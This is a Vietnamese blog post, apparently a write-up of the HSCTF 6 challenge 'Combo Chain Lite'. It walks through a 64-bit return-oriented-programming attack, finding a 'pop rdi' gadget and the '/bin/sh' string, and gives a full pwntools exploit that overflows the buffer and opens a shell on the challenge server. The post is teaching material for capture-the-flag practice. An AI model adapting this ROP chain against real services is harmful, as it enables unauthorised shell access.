---
layout: post
published: true
title: 'HSCTF 6: Combo Chain Lite'
---
Xin chào.
Hôm nay mình muốn viết lại challenge này.

![Capture-combo-chain-lite.PNG]({{site.baseurl}}/img/ctf/HSCTF/2019/Capture-combo-chain-lite.PNG)


Chall sử dụng ROP (Return Oriented Programming). Nên trước tiên ta tìm địa chỉ chưa ROPgadget phù hợp.
Trong quy ước gọi ([calling conventions](https://ctf101.org/binary-exploitation/what-are-calling-conventions/)), các đối số được truyền vào các registers trong các chương trình 64-bit theo thứ tự như link tham khảo. Trong trường hợp của gọi `system`, thì chúng ta cần phải điều khiển thanh ghi RDI. Mình sẽ tìm các ROPgadget liên quan tới `pop rdi`. 

{: .box-note}
ROPgadget --binary ./combo-chain-lite | grep "pop rdi"
Khi đã có được địa chỉ của ROP, tiếp theo ta cần tìm cách đưa chuỗi "/bin/sh" vào như đối số của `system`. !<p align="center">
  ![exec-combo-chain-lite.PNG]({{site.baseurl}}/img/ctf/HSCTF/2019/exec-combo-chain-lite.PNG)
</p>
  
Nếu để ý thì trong chương trình đã có sẵn chuỗi đó, việc cần làm là tìm địa chỉ của nó trong chương trình mà thôi.
Có thể dùng gef hoặc gdb-peda:

{% highlight bash linenos %}
$ gdb ./combo-chain-lite
gef➤  r
...
gef➤  grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/home/node/tmp/combo-chain-lite'(0x402000-0x403000), permission=r--
  0x402051 - 0x402058  →   "/bin/sh"
{% endhighlight %}

<p align="center">
![combo-chain-lite-stack.png]({{site.baseurl}}/img/ctf/HSCTF/2019/combo-chain-lite-stack.png)
</p>
Đoạn code exploit của mình:

{% highlight python linenos %}
#Completed

from pwn import *

rm = remote("pwn.hsctf.com", 3131)

padding = "AAA%AAsAABAA$AAn" #16 ki tu (random pattern)
bin_addr = p64(0x402051) #hoac 0x403051 /bin/sh string
rop_addr = p64(0x0000000000401273)
sys_addr = p64(int(rm.recv().rsplit(': ')[1], 16)) 

#print sys_addr #sys_addr
payload = padding + rop_addr  + bin_addr + sys_addr
print payload
rm.recv()
rm.sendline(payload)
rm.interactive()
rm.close()
{% endhighlight %}








